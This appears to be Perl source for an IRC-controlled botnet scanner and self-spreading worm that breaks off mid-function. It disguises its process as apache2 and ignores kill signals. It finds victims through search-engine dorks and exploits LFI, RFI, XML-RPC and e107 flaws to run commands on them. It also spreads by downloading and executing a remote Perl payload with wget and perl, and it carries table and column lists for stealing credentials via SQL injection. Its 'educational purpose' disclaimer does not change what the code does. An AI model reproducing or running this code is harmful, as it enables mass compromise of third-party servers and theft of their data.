#!/usr/bin/perl
$powered="ByroeNet";
$mail="admin(at)byroe.net";
#####################################################################################
## ##
## 17/06/2010 ##
## Author : ByroeNet Team ##
## Team : Irc.Byroe.Net ##
## Regrets : Voo_Doo ##
## ##
## ## IMPORTANT ## ##
## # ONLY FOR EDUCATIONAL PURPOSE. THE AUTHOR IS NOT RESPONSABLE OF ANY ##
## # IMPROPERLY USE OF THIS TOOL. USE IT AT YOUR OWN RISK !! ##
## # THIS TOOL HAS BEEN MADE TO HELP NET ADMINISTRATORS TO MAKE THEIR ##
## # SYSTEM MORE SECURE. ##
## ## ##
## ##
## Features: ##
## [+]Sql Injection Scanner ##
## [+]e107 Scanner ##
## [+]XML (Extensible Markup Language) Injection Scanner ##
## [+]Remote File Inclusion Scanner ##
## [+]Local File Inclusion Scanner ##
## [+]RCE r107 / LFI / XML ##
## [+]Integrated Shell, so you can execute commands on the server ##
## [+]Spread Mode, to activate or disable Spread Function ##
## ##
#####################################################################################
use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use IO::Select;
use IO::Socket::INET;
use Socket;
use HTTP::Request::Common;
use LWP::Simple;
use LWP 5.64;
use HTTP::Request::Common qw(POST);
use Digest::MD5 qw(md5_hex);
use MIME::Base64;
my $fakeproc = "/usr/sbin/apache2 -k start";
$ircserver = "irc.byroe.net";
my $ircport = "6667";
my $nickname = "ByroeNet";
my $ident = "ByroeNet";
my $channel = "#maniak";
my $runner = "ByroeNet";
my $fullname = 'ByroeNet New Scanner';
my $lfi = "!lfi";
my $xml = "!xml";
my $e107 = "!e107";
my $sql = "!sql";
my $rfi = "!rfi";
my $cmdlfi = "!cmdlfi";
my $cmde107 = "!cmde107";
my $cmdxml = "!cmdxml";
my $rspo_test = "../../../../../../../../../../../../../../../proc/self/environ%00";
my $rfiid = "http://pastebin.com/raw.php?i=0qvxtQf6?";
my $byroesprd = "http://pastebin.com/raw.php?i=xA6hdAb1";
my @tabele = ('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario',
'name','names','nombre','nombres','usuarios','member','members','admin_table','miembro','miembros','membername','admins','administrator',
'administrators','passwd','password','passwords','pass','Pass','tAdmin','tadmin','user_password','user_passwords','user_name','user_names',
'member_password','mods','mod','moderators','moderator','user_email','user_emails','user_mail','user_mails','mail','emails','email','address',
'e-mail','emailaddress','correo','correos','phpbb_users','log','logins','login','registers','register','usr','usrs','ps','pw','un','u_name','u_pass',
'tpassword','tPassword','u_password','nick','nicks','manager','managers','administrador','tUser','tUsers','administradores','clave','login_id','pwd','pas','sistema_id',
'sistema_usuario','sistema_password','contrasena','auth','key','senha','tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member',
'tb_users','tb_user','tb_sys','sys','fazerlogon','logon','fazer','authorization','membros','utilizadores','staff','nuke_authors','accounts','account','accnts',
'associated','accnt','customers','customer','membres','administrateur','utilisateur','tuser','tusers','utilisateurs','password','amministratore','god','God','authors',
'asociado','asociados','autores','membername','autor','autores','Users','Admin','Members','Miembros','Usuario','Usuarios','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO');
my @kolumny = ('admin_name','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email',
'user_name','username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail',
'usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','login_id','usr','sistema_id','author',
'sistema_usuario','auth','key','membername','nme','unme','psw','password','user_password','autores','pass_hash','hash','pass','correo',
'userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors',
'user_pwd','u_pass','clave','usuario','contrasena','pas','sistema_password','autor','upassword','web_password','web_username');
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
chdir("/tmp");
$ircserver="$ARGV[0]" if $ARGV[0];
$0 = "$fakeproc"."\0"x16;;
&SIGN();
my $pid = fork;
exit if $pid;
die "\n [!] Something Wrong !!!: $!" unless defined($pid);
our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();
sub sendraw {
if ($#_ == '1') {
my $socket = $_[0];
print $socket "$_[1]\n";
} else {
print $IRC_cur_socket "$_[0]\n";
}
}
sub connector {
my $mynick = $_[0];
my $ircserver_con = $_[1];
my $ircport_con = $_[2];
my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
if (defined($IRC_socket)) {
$IRC_cur_socket = $IRC_socket;
$IRC_socket->autoflush(1);
$sel_client->add($IRC_socket);
$irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
$irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
$irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
nick("$mynick");
sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
sleep 1;
}
}
sub parse {
my $servarg = shift;
if ($servarg =~ /^PING \:(.*)/) {
sendraw("PONG :$1");
} elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
if ($args =~ /^\001VERSION\001$/) {
notice("$pn", "\001VERSION mIRC v6.17 Khaled Mardam-Bey\001");
}
if ($args =~ /^(\Q$mynick\E|\!a)\s+(.*)/ ) {
my $natrix = $1;
my $arg = $2;
}
}
elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
if (lc($1) eq lc($mynick)) {
$mynick=$4;
$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
}
} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
nick("$mynick|".int rand(9999));
} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
$mynick = $2;
$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
sendraw("MODE $nickname +Bx");
sendraw("JOIN $channel");
sendraw("PRIVMSG $channel :Hello, I`m Ready To Scanner");
sendraw("PRIVMSG $runner :Hi $runner im here !!!");
}
}
my $line_temp;
while( 1 ) {
while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
delete($irc_servers{''}) if (defined($irc_servers{''}));
my @ready = $sel_client->can_read(0);
next unless(@ready);
foreach $fh (@ready) {
$IRC_cur_socket = $fh;
$mynick = $irc_servers{$IRC_cur_socket}{'nick'};
$nread = sysread($fh, $msg, 4096);
if ($nread == 0) {
$sel_client->remove($fh);
$fh->close;
delete($irc_servers{$fh});
}
@lines = split (/\n/, $msg);
$msg =~ s/\r\n$//;
if ($msg=~ /PRIVMSG $channel :!help/){
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3Help15) 10Contact My Admin . . . .");
}
if ($msg=~ /PRIVMSG $channel :!version/){
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3Version15) 10Apple iPhone");
}
if ($msg=~ /PRIVMSG $channel :!engine/){
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3Engine15) 10Google, Bing, AllTheWeb, Altavista, ASK, UOL, Yahoo.");
}
if ($msg=~ /PRIVMSG $channel :!pid/){
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3PID15) 10 Process/ID : 4 $fakeproc - $$");
}
if ($msg=~ /PRIVMSG $channel :!about/){
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3About15)3 Multi Scanner v2");
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3About15)3 Coded by BaMbY ");
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3About15)3 Copyright © 2010 ByroeNet");
}
##################################################################### CMD IRC
if ($msg=~ /PRIVMSG $channel :!enc\s+(.*)/){
my $enc = $1;
&enc($enc);
}
if ($msg=~ /PRIVMSG $channel :!dec\s+(.*)/){
my $dec = $1;
&dec($dec);
}
if ($msg=~ /PRIVMSG $channel :!btjoin\s+(.*)/){
my $cnls = $1;
&join($cnls);
}
if ($msg=~ /PRIVMSG $channel :!btpart\s+(.*)/){
my $cnls = $1;
&part($cnls);
}
if ($msg=~ /PRIVMSG $channel :!okdeh\s+(.*)/){
my $cnls = $1;
&quit($cnls);
}
if ($msg=~ /PRIVMSG $channel :!respon/){
my $re = query($rfiid);
if ( $re =~ /ByroeNet/ ) {
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3Info15)3 Response is working !");
}
else {
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3Info15)3 Response is 4NOT3 working !");
}
}
##################################################################### CMD LFI
if ($msg=~ /PRIVMSG $channel :$cmdlfi\s+(.*?)\s+(.*)/){
my $url = $1."../../../../../../../../../../../../../../../proc/self/environ%00";
my $cmd = $2;
&cmdlfi($url,$cmd);
}
#####################################################################
##################### LFI LFI LFI ###################
##################################################################### Google Engine
if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "GooGLe";
my $bugx = $1;
my $d0rk = $2;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3LFI15)10 Dork :4 $d0rk");
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3LFI15)10 File :4 $bugx");
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3LFI15)7 Search Engine Loading ...");
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### AllTheWeb Engine
if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AllTheWeb";
my $bugx = $1;
my $d0rk = $2;
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Bing Engine
if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "Bing";
my $bugx = $1;
my $d0rk = $2;
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Altavista Engine
if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "ALtaViSTa";
my $bugx = $1;
my $d0rk = $2;
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### ASK Engine
if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AsK";
my $bugx = $1;
my $d0rk = $2;
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### UoL Engine
if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "UoL";
my $bugx = $1;
my $d0rk = $2;
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Yahoo Engine
if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "YahOo";
my $bugx = $1;
my $d0rk = $2;
&lfiscan($engx,$bugx,$d0rk);
}
exit;
}
}
#####################################################################
##################### XML XML XML ###################
#####################################################################
if ($msg=~ /PRIVMSG $channel :$cmdxml\s+(.*?)\s+(.*)/){
my $url = $1;
my $cmd = $2;
&cmdxml($url,$cmd);
}
##################################################################### GooGle Engine
if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "GooGLe";
my $bugx = $1;
my $d0rk = $2;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3XML15)10 Dork :4 $d0rk");
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3XML15)10 File :4 $bugx");
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3XML15)7 Search Engine Loading ...");
&xmlscan($engx,$bugx,$d0rk);
}
exit;
}
}
##################################################################### AllTheWeb Engine
if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AllTheWeb";
my $bugx = $1;
my $d0rk = $2;
&xmlscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Bing Engine
if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "Bing";
my $bugx = $1;
my $d0rk = $2;
&xmlscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Altavista Engine
if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "ALtaViSTa";
my $bugx = $1;
my $d0rk = $2;
&xmlscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### ASK Engine
if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AsK";
my $bugx = $1;
my $d0rk = $2;
&xmlscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### UoL Engine
if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "UoL";
my $bugx = $1;
my $d0rk = $2;
&xmlscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Yahoo Engine
if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "YahOo";
my $bugx = $1;
my $d0rk = $2;
&xmlscan($engx,$bugx,$d0rk);
}
exit;
}
}

#####################################################################
##################### RFI RFI RFI ###################
##################################################################### GooGle Engine

if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "GooGLe";
my $bugx = $1;
my $d0rk = $2;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3RFI15)10 Dork :4 $d0rk");
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3RFI15)10 File :4 $bugx");
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3RFI15)7 Search Engine Loading ...");
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### AllTheWeb Engine
if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AllTheWeb";
my $bugx = $1;
my $d0rk = $2;
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Bing Engine
if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "Bing";
my $bugx = $1;
my $d0rk = $2;
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Altavista Engine
if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "ALtaViSTa";
my $bugx = $1;
my $d0rk = $2;
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### ASK Engine
if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AsK";
my $bugx = $1;
my $d0rk = $2;
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### UoL Engine
if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "UoL";
my $bugx = $1;
my $d0rk = $2;
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Yahoo Engine
if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "YahOo";
my $bugx = $1;
my $d0rk = $2;
&rfiscan($engx,$bugx,$d0rk);
}
exit;
}
}
#####################################################################
##################### SQL SQL SQL ###################
##################################################################### GooGle Engine

if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "GooGLe";
my $bugx = $1;
my $d0rk = $2;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)10 Dork :4 $d0rk");
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)10 File :4 $bugx");
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)7 Search Engine Loading ...");
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### AllTheWeb Engine
if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AllTheWeb";
my $bugx = $1;
my $d0rk = $2;
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Bing Engine
if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "Bing";
my $bugx = $1;
my $d0rk = $2;
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Altavista Engine
if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "ALtaViSTa";
my $bugx = $1;
my $d0rk = $2;
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### ASK Engine
if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AsK";
my $bugx = $1;
my $d0rk = $2;
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### UoL Engine
if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "UoL";
my $bugx = $1;
my $d0rk = $2;
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Yahoo Engine
if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "YahOo";
my $bugx = $1;
my $d0rk = $2;
&sqlscan($engx,$bugx,$d0rk);
}
exit;
}
}
#####################################################################
##################### e107 e107 e107 ###################
##################################################################### GooGle Engine
if ($msg=~ /PRIVMSG $channel :$cmde107\s+(.*?)\s+(.*)/){
my $url = $1;
my $cmd = $2;
&cmde107($url,$cmd);
}
if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "GooGLe";
my $bugx = "/contact.php";
my $d0rk = $1;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3e10715)10 Dork :4 $d0rk");
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3e10715)10 File :4 $bugx");
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3e10715)7 Search Engine Loading ...");
&e107scan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### AllTheWeb Engine
if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AllTheWeb";
my $bugx = "/contact.php";
my $d0rk = $1;
&e107scan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Bing Engine
if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "Bing";
my $bugx = "/contact.php";
my $d0rk = $1;
&e107scan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Altavista Engine
if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "ALtaViSTa";
my $bugx = "/contact.php";
my $d0rk = $1;
&e107scan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### ASK Engine
if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "AsK";
my $bugx = "/contact.php";
my $d0rk = $1;
&e107scan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### UoL Engine
if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "UoL";
my $bugx = "/contact.php";
my $d0rk = $1;
&e107scan($engx,$bugx,$d0rk);
}
exit;
}
}

##################################################################### Yahoo Engine
if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) { exit; } else {
my $engx = "YahOo";
my $bugx = "/contact.php";
my $d0rk = $1;
&e107scan($engx,$bugx,$d0rk);
}
exit;
}
}
for(my $c=0; $c<= $#lines; $c++) {
$line = $lines[$c];
$line=$line_temp.$line if ($line_temp);
$line_temp='';
$line =~ s/\r$//;
unless ($c == $#lines) {
parse("$line");
} else {
if ($#lines == 0) {
parse("$line");
} elsif ($lines[$c] =~ /\r$/) {
parse("$line");
} elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
parse("$line");
} else {
$line_temp = $line;
}
}
}
}
}
##################################################################### Procedure
sub cmdlfi() {
my $browser = LWP::UserAgent->new;
my $url = $_[0];
my $cmd = $_[1];
my $hie = "j13mbut /dev/stdout\"); ?>j13mbut";
$browser->agent("$hie");
$browser->timeout(3);
$response = $browser->get( $url );
if ($response->content =~ /j13mbut(.*)j13mbut/s) {
print $1;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3LFICMD15)4 $1");
}
}

sub lfiscan() {
my $engz = $_[0];
my $bugz = $_[1];
my $dork = $_[2];
my $contatore = 0;
if ($engz =~ /GooGLe/) {
my @lfigoogle=&google($dork);
push(@lfitotal, @lfigoogle);
}
if ($engz =~ /AllTheWeb/) {
my @lfialltheweb=&alltheweb($dork);
push(@lfitotal, @lfialltheweb);
}
if ($engz =~ /Bing/) {
my @lfiBing=&Bing($dork);
push(@lfitotal, @lfiBing);
}
if ($engz =~ /ALtaViSTa/) {
my @lfialtavista=&altavista($dork);
push(@lfitotal, @lfialtavista);
}
if ($engz =~ /AsK/) {
my @lfiask=&ask($dork);
push(@lfitotal, @lfiask);
}
if ($engz =~ /UoL/) {
my @lfiuol=&uol($dork);
push(@lfitotal, @lfiuol);
}
if ($engz =~ /YahOo/) {
my @lfiyahoo=&yahoo($dork);
push(@lfitotal, @lfiyahoo);
}
my @lficlean = &calculate(@lfitotal);
if (scalar(@clean) != 0) {
}
my $uni=scalar(@lficlean);
foreach my $lfitarget (@lficlean)
{
$contatore++;
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3LFI15)(4@3$engz15)10 Scan Finish for14 $dork");
}
my $lfi = "../../../../../../../../../../../../../../..";
my $xpl = "http://".$lfitarget.$bugz.$rspo_test;
my $vuln = "http://".$lfitarget."12".$bugz."7".$rspo_test."";
my $re = getcontent($xpl);
if ($re =~ /DOCUMENT_ROOT=\// && $re =~ /HTTP_USER_AGENT/){
if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
my $rspo = lfiexploit($xpl,"uname -svnrp;echo J13mb0T;id");
$rspo =~ s/\n//g;
if ($rspo =~ /j13mb0t#(.*)J13mb0Tuid=(.*)#j13mb0t/sg) {
my ($sys,$uid) = ($1,$2);
my $lfispread = "cd /tmp;lwp-download $byroesprd -O php.jpg;perl php.jpg;rm -rf *.jpg*;wget $byroesprd -O php.jpg;perl php.jpg;rm -rf *.jpg*";
my $tmp = "/tmp/cmd".int rand(2010);
my $upload = lfiexploit($xpl,"wget $rfiid -O $tmp;$lfispread"); sleep(1);
my $res = getcontent("http://".$lfitarget.$bugz.$lfi.$tmp.'%00');
if ($res =~ /BaMbY/) {
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3LFI15)(4@3$engz15)15(13@12PHPSheLL15)4 http://".$lfitarget."12".$bugz."6".$lfi."7".$tmp."%00 15(7@3".$sys."15)");
}
else {
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3LFI15)(4@3$engz15)15(13@12System15)4 http://".$lfitarget."12".$bugz."6[LFI] 15(7@3".$sys." 7uid=".$uid."15)");
}
}
else {
}
} exit } sleep(3);
}
}
}

sub cmdxml() {
my $jed = $_[0];
my $dwa = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
$exploit = "";
$exploit .= "test.method";
$exploit .= "',''));";
$exploit .= "echo'bamby';echo`".$dwa."`;echo'solo';exit;/*";
my $response = $userAgent->request(POST $jed,Content_Type => 'text/xml',Content => $exploit);
if ($response->content =~ /bamby(.*)solo/s) {
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3XMLCMD15)4 $1");
}
}

sub xmlscan() {
my $engz = $_[0];
my $bugz = $_[1];
my $dork = $_[2];
my $contatore = 0;
if ($engz =~ /GooGLe/) {
my @xmlgoogle=&google($dork);
push(@xmltotal, @xmlgoogle);
}
if ($engz =~ /AllTheWeb/) {
my @xmlalltheweb=&alltheweb($dork);
push(@xmltotal, @xmlalltheweb);
}
if ($engz =~ /Bing/) {
my @xmlBing=&Bing($dork);
push(@xmltotal, @xmlBing);
}
if ($engz =~ /ALtaViSTa/) {
my @xmlaltavista=&altavista($dork);
push(@xmltotal, @xmlaltavista);
}
if ($engz =~ /AsK/) {
my @xmlask=&ask($dork);
push(@xmltotal, @xmlask);
}
if ($engz =~ /UoL/) {
my @xmluol=&uol($dork);
push(@xmltotal, @xmluol);
}
if ($engz =~ /YahOo/) {
my @xmlyahoo=&yahoo($dork);
push(@xmltotal, @xmlyahoo);
}
my @xmlclean = &calculate(@xmltotal);
if (scalar(@xmlclean) != 0) {
}
my $uni=scalar(@xmlclean);
foreach my $xmltarget (@xmlclean)
{
$contatore++;
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3XML15)(4@3$engz15)10 Scan Finish for14 $dork");
}
my $xpl = "http://".$xmltarget.$bugz;
my $xmlsprd = "cd /tmp;lwp-download $byroesprd -O php.jpg;perl php.jpg;rm -rf *.jpg*;wget $byroesprd -O php.jpg;perl php.jpg;rm -rf *.jpg*";
my $strona = getcontent($xpl);
if ( $strona =~ /faultCode/ ) {
xmlcek($xpl);
xmlxspread($xpl,$xmlsprd);
}
}
}

sub rfiscan() {
my $engz = $_[0];
my $bugz = $_[1];
my $dork = $_[2];
my $contatore = 0;
if ($engz =~ /GooGLe/) {
my @rfigoogle=&google($dork);
push(@rfitotal, @rfigoogle);
}
if ($engz =~ /AllTheWeb/) {
my @rfialltheweb=&alltheweb($dork);
push(@rfitotal, @rfialltheweb);
}
if ($engz =~ /Bing/) {
my @rfiBing=&Bing($dork);
push(@rfitotal, @rfiBing);
}
if ($engz =~ /ALtaViSTa/) {
my @rfialtavista=&altavista($dork);
push(@rfitotal, @rfialtavista);
}
if ($engz =~ /AsK/) {
my @rfiask=&ask($dork);
push(@rfitotal, @rfiask);
}
if ($engz =~ /UoL/) {
my @rfiuol=&uol($dork);
push(@rfitotal, @rfiuol);
}
if ($engz =~ /YahOo/) {
my @rfiyahoo=&yahoo($dork);
push(@rfitotal, @rfiyahoo);
}
my @rficlean = &calculate(@rfitotal);
if (scalar(@rficlean) != 0) {
}
my $uni=scalar(@rficlean);
foreach my $rfitarget (@rficlean)
{
$contatore++;
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3RFI15)(4@3$engz15)10 Scan Finish for14 $dork");
}
my $rfixpl = "http://".$rfitarget.$bugz.$rfiid;
my $inj = "http://".$rfitarget."12".$bugz."7[PHP-SHELL]?";
my $re = getcontent($rfixpl);
if ($re =~ /BaMbY/){
getcontent($rfispd);
os($rfixpl);
